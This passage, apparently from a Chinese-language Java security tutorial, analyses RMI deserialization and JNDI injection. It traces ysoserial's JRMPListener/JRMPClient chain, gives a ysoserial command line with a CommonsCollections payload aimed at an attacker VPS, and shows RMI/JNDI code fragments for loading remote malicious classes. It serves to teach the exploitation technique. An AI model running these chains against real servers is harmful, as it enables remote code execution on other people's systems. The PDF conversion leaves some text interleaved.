17
            //在TCPTransport类的handleMessages方法中获取到了80
18
            dos.write(TransportConstants.Call); //80
19
            //下面依然是往服务器发送数据，但是经过了序列化处理
20
            @SuppressWarnings ( "resource" )
21
            final ObjectOutputStream objOut = new 
MarshalOutputStream(dos);
22
            //下面四组数据最终发到服务端是用来创建ObjID对象，并且值与
dgcID[0:0:0, 2]相同
23
            objOut.writeLong(2); // DGC
24
            objOut.writeInt(0);
25
            objOut.writeLong(0);
26
            objOut.writeShort(0);
27
            //下面数据是在服务端每一个dispatch方法中获取的
28
            objOut.writeInt(1); // dirty
29
            objOut.writeLong(-669196253586618813L);
30
            //前面经过那么多数据的通信，到了这里就可以发送恶意payload了，服务端会
对其进行反序列化处理。
31
            objOut.writeObject(payloadObject);
32
33
            os.flush();
34
        }
35
        finally {
36
            if ( dos != null ) {
37
                dos.close();
38
            }
39
            if ( s != null ) {
40
                s.close();
41
            }
42
        }
43
    }
44
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 
CommonsCollecitons1 'calc.exe' java -jar ysoserial.jar JRMPClient 
'vpsIP:PORT' > vulrServer
1
这个payloads/JRMPClient 是结合 exploit/JRMPListener 使⽤的（还没看
exploit/JRMPClient）
在⾃⼰的 vps 上挂起 exploit/JRMPListener （可⾃定义反序列化 payload）。
将 payloads/JRMPClient ⽣成的 payload （指定⾃⼰vps的IP和端⼝）发送到漏洞服务器上，
反序列化时，将会根据 JRMP 协议反向连接 vps ，在通信的同时，vps 会将指定好的payload 
序列化后再次发送到漏洞服务器上，利⽤正在与 vps 上 exploit/JRMPListener 通信的 
JRMPClient 第⼆次反序列化 vps 发送过来的payload，从⽽造成 RCE
payloads/JRMPClient(为什么它反序列化时会发起⼀个对外连接呢？)
然后这个 JRMPClient 依靠的就是 RemoteObjectInvocationHandler 反序列化时，会⾃动调⽤
其⽗类 RemoteObject 的 readObject 函数
然后，我们看反序列化后具体的执⾏流程
先来看看 payloads/JRMPClient 的调⽤流程：
查看关键函数getObject
竖线部分，都是和需要反向连接的 host 和 port 还有 objID 等必要因素（似乎整个流程利⽤的
也是 jre 中已经实现的 rmi 相关的功能）
然后将他们都带⼊了 LiveRef 中，接着⼜封装进了 UnicastRef ⾥，再继续封装进 
RemoteObjectInvocationHandler 中，最后⽤ Proxy.newProxyInstance ⽣成了⼀个 proxy ，
这个就⽐较熟悉了，和 rmi 反序列化利⽤的⼀样，先⽣成⼀个 proxy，利⽤点就在 
invocationHandler 这个成员变量，如上图，也是将 RemoteObjectInvocationHandler 作为了 
proxy 的 invocationHandler 成员变量值
然后这个 JRMPClient 依靠的就是 RemoteObjectInvocationHandler 反序列化时，会⾃动调⽤
其⽗类 RemoteObject 的 readObject 函数 这⾥可能就是为什么在weblogic的payload⾥删掉
RemoteObjectInvocationHandler也可以的原因？ref反序列化也就直接readObject⾛下去了
UnicastRef 也继承了RemoteObject！！！
跟进去，在 RemoteObject 中
这⾥肯定进⼊的是 else，因为我们反序列化创建的是指定了 UnicastRef 这个类的，不会没有名
字
继续看 else
这⾥最后调⽤了 UnicastRef 的 readExternal 函数（这个是序列化的另⼀种⽅式，实现
Externalizable 接⼝）
再调⽤了 read，跟进
这后续的好⼏个部分的内容，都可以根据作者给出的调⽤流程跟进了，不会分析的太详细
步步跟进后，跟到了这⾥：
利⽤的DGC
继续跟进，在调⽤流程⾥提示的是，这⾥调⽤的是 DGCImpl_Stub ⾥的 dirty
看⻅这⼏个框，就感觉很熟悉很熟悉，仔细想想其实就是 rmi 反序列化利⽤过程中 RMI client 
中 RegistryImpl_Stub 的实际操作，如下图：
接收到JRMPListener payload后
从 JRMPListener ⽣成的这个 ex 对象来看，应该还是个异常相关的
还记得 Registry 利⽤的过程中，就是利⽤了 server 执⾏的代码后，直接 throw 出异常，然后
返回给 client 端，造成了命令执⾏的回显
那么这⾥理应也该如此，只是利⽤⽅式反过来了，在 JRMPClient 接收到 JRMPListener 的反
馈的异常后，就会将异常反序列化，并且打印出来，那么反序列化过程中，⼜肯定会去反序列化 
BadAttributeValueExpException 对象中的 val 成员变量，那么这个时候就触发了我们构造好的 
payload
具体是在 DGCImpl_Stub 的 dirty ⾥
发送了⼀个 newCall 给 JRMPListener 后，继续获取 JRMPListener 的反馈
跟进 UnicastRef.invoke 函数
⽼路⼦，跟进 StreamRemoteCall.executeCall 函数
我们从上⽂中知道了，这⾥肯定是进⼊ case2 的，接着反
exploit/JRMPListener
监听到Client连接后的处理流程
看看它的⼊⼝函数：
第⼀个红框就是代替了⽤户⾃定义输⼊，我们直接⼿动⽣成 payloadObject，随即就被作为参数
带⼊了 JRMPListener 的构造函数⾥，最后调⽤了 run 函数
先看看 构造函数
payloadObject 赋值给了 当前类的 pyaloadObject 成员，随即就开启的 socket 服务端，准备
好来⾃ JRMPClient 的连接
跟进 run 函数发现，⼀来就开始 accept 来⾃任意 client 的tcp 连接，但是收到连接后，会根据
条件进⾏限制，必须是经过 JRMP 协议的连接才⾏，这其中有⼀些协议解析的控制流程，就不
细看了，我们直接看如果是正常 JRMP 协议的 tcp 连接，那么会进⼊到如下图：
满⾜第⼀个 case 也可以进⼊第⼆个 case 的，其实这两个 case 的判断条件就是⼀个数字⽽
已，75和76，感觉很熟悉，和 Registry ⾥的 rmi server 端类似
可以看⻅，将重要的东⻄都带⼊了 doMessage 函数⾥，其中还有 payloadObject ，也就是我
们⾃定义⽣成的 payload
跟进 doMessage 函数
读取⼀个 int ，然后根据其值做不同的操作，这个 TransportConstants.Call 其实就是 80
哈，很熟悉吧，Registry ⾥也是 80，可以在 StreamRemoteCall 的构造函数⾥看⻅，它向 
server 端发送了⼀个 80
回到 doMessage 函数中，我们继续跟踪 doCall 函数
（⾥⾯其实最重要的部分在于向 client 端发送 payload ，其他部分都仅仅是优化了⽤户体验-
输出显示进度....）
就看关键部分
先返回了⼀个 TransportConstants.ExceptionalReturn ，其值为 2
这⾥⽣成了⼀个 BadAttributeValueExpException 的对象，然后将其 val 成员变量设置为 
payload 了，这⾥的payload是我们选取的 CommonsCelloections5 模块⽣成的，只要有反序
列化，那么就会触发代码执⾏。最后将其发送给了 JRMPClient
到这⾥ JRMPListener 已经分析完了
四、Java RMI的动态加载类
RMI的流程中，客户端和服务端之间传递的是⼀些序列化后的对象。如果某⼀端反序列化时发现
⼀个对象，那么就会去⾃⼰的CLASSPATH下寻找想对应的类。
如果当前JVM中没有某个类的定义（即CLASSPATH下没有），它可以根据codebase去下载这
个类的class，然后动态加载这个对象class⽂件。
java.rmi.server.codebase：java.rmi.server.codebase属性值表示⼀个或多个URL位置，可以从
中下载本地找不到的类，相当于⼀个代码库。代码库定义为将类加载到虚拟机的源或场所，可以
将CLASSPATH视为“本地代码库”，因为它是磁盘上加载本地类的位置的列表。就像
CLASSPATH"本地代码库"⼀样，⼩程序和远程对象使⽤的代码库可以被视为"远程代码库"。
codebase是⼀个地址，告诉Java虚拟机我们应该从哪个地⽅去搜索类；CLASSPATH是本地路
径，⽽codebase通常是远程URL，⽐如http、ftp等。所以动态加载的class⽂件可以保存在web
服务器、ftp中。
如果我们指定 codebase=http://example.com/ ，动态加载 org.vulhub.example.Example 
类，
则Java虚拟机会下载这个⽂件http://example.com/org/vulhub/example/Example.class，并
作为 Example类的字节码。
那么只要控制了codebase，就可以加载执⾏恶意类。同时也存在⼀定的限制条件：
由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进⾏远程加载类，
需要安装RMISecurityManager并且配置java.security.policy，这在后⾯的利⽤中可以看到。
属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从JDK 6u45、7u21开始，
java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁⽤⾃动加载远
程类⽂件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类⽂
件。使⽤这个属性来防⽌虚拟机从其他Codebase地址上动态加载类，增加了RMI 
ClassLoader的安全性。
安装并配置了SecurityManager
Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false
java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好
的 codebase ，不再⽀持从RMI请求中获取。
注：在JNDI注⼊的利⽤⽅法中也借助了这种动态加载类的思路。
漏洞的主要原理是RMI远程对象加载，即RMI Class Loading机制，会导致RMI客户端命令执⾏
的
举⼀个⼩栗⼦：
客户端：
五、JNDI及注⼊
简单来说，JNDI (Java Naming and Directory Interface) 是⼀组应⽤程序接⼝，它为开发⼈员
查找和访问各种资源提供了统⼀的通⽤接⼝，可以⽤来定位⽤户、⽹络、机器、对象和服务等各
种资源。⽐如可以利⽤JNDI在局域⽹上定位⼀台打印机，也可以⽤JNDI来定位数据库服务或⼀
ICalc r = (ICalc) Naming.lookup("rmi://192.168.135.142:1099/refObj");
1
//从服务端获取RMI服务
2
List li = new Payload();
3
//本地只有一个抽象接口，具体是从cosebase获取的class文件
4
r.sum(li);//RMI服务调用，在这里触发从cosebase中读取class文件执行
5
个远程Java对象。JNDI底层⽀持RMI远程对象，RMI注册的服务可以通过JNDI接⼝来访问和调
⽤。
其应⽤场景⽐如：动态加载数据库配置⽂件，从⽽保持数据库代码不变动等。
这些对象可以存储在不同的命名或⽬录服务中，例如远程⽅法调⽤（RMI），通⽤对象请求代理
体系结构（CORBA），轻型⽬录访问协议（LDAP）或域名服务（DNS）。（此篇中我们将着
重讲解RMI，提到LDAP）
JNDI⽀持多种命名和⽬录提供程序（Naming and Directory Providers），RMI注册表服务提供
程序（RMI Registry Service Provider）允许通过JNDI应⽤接⼝对RMI中注册的远程对象进⾏访
问操作。将RMI服务绑定到JNDI的⼀个好处是更加透明、统⼀和松散耦合，RMI客户端直接通过
URL来定位⼀个远程对象，⽽且该RMI服务可以和包含⼈员，组织和⽹络资源等信息的企业⽬录
链接在⼀起。
RMI服务端在绑定远程对象⾄注册中⼼时，不只是可以绑定RMI服务器本身上的对象，还可以使
⽤Reference对象指定⼀个托管在第三⽅服务器上的class⽂件，再绑定给注册中⼼。
在客户端处理服务端返回数据时，发现是⼀个Reference对象，就会动态加载这个对象中的类。
攻击者只要能够
JNDI接⼝在初始化时，可以将RMI URL作为参数传⼊，⽽JNDI注⼊就出现在客户端的lookup()
函数中，如果lookup()的参数可控就可能被攻击。
控制RMI客户端去调⽤指定RMI服务器
在可控RMI服务器上绑定Reference对象，Reference对象指定远程恶意类
远程恶意类⽂件的构造⽅法、静态代码块、getObjectInstance()⽅法等处写⼊恶意代码
就可以达到RCE的效果。fasjson组件漏洞rmi、ldap的利⽤形式正是使⽤lndi注⼊，⽽不是有关
RMI反序列化。
Hashtable env = new Hashtable();
1
env.put(Context.INITIAL_CONTEXT_FACTORY, 
"com.sun.jndi.rmi.registry.RegistryContextFactory");
2
//com.sun.jndi.rmi.registry.RegistryContextFactory 是RMI Registry Service 
Provider对应的Factory
3
env.put(Context.PROVIDER_URL, "rmi://kingx_kali:8080");
4
注：InitialContext 是⼀个实现了 Context接⼝的类。使⽤这个类作为JNDI命名服务的⼊⼝点。
创建InitialContext 对象需要传⼊⼀组属性，参数类型为java.util.Hashtable或其⼦类之⼀。
JNDI注⼊ 利⽤JNDI References进⾏注⼊
我们来到JNDI注⼊的核⼼部分，关于JNDI注⼊，@pwntester在BlackHat上的讲义中写的已经很
详细。我们这⾥重点讲⼀下和RMI反序列化相关的部分。接触过JNDI注⼊的同学可能会疑问，不
应该是RMI服务器最终执⾏远程⽅法吗，为什么⽬标服务器lookup()⼀个恶意的RMI服务地址，
会被执⾏恶意代码呢？
在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定⼀个
外部的远程对象（当前名称⽬录系统之外的对象）。绑定了Reference之后，服务端会先通过
Referenceable.getReference()获取绑定对象的引⽤，并且在⽬录中保存。当客户端在lookup()
查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转
换为具体的对象实例。
整个利⽤流程如下：
1. ⽬标代码中调⽤了InitialContext.lookup(URI)，且URI为⽤户可控；
2. 攻击者控制URI参数为恶意的RMI服务(⾥⾯包含了恶意class的http地址)，如：
rmi://hacker_rmi_server//name；
3. 攻击者RMI服务器向⽬标返回⼀个Reference对象，Reference对象中指定某个精⼼构造的
Factory类；
4. ⽬标在进⾏lookup()操作时，会动态加载并实例化Factory类，接着调⽤
factory.getObjectInstance()获取外部远程对象实例；
攻击者可以在Factory类⽂件的构造⽅法、静态代码块、getObjectInstance()⽅法等处写⼊恶意
代码，达到RCE的效果；
ClIENT.java（受害者）
SERVER.java(攻击者部署)
Context ctx = new InitialContext(env);
5
Object local_obj = ctx.lookup("rmi://kingx_kali:8080/test");
6
package jndi注入;
1
import javax.naming.Context;
2
import javax.naming.InitialContext;
3
4
public class CLIENT {
5
6
    public static void main(String[] args) throws Exception {
7
8
        String uri = "rmi://127.0.0.1:1099/aa";
9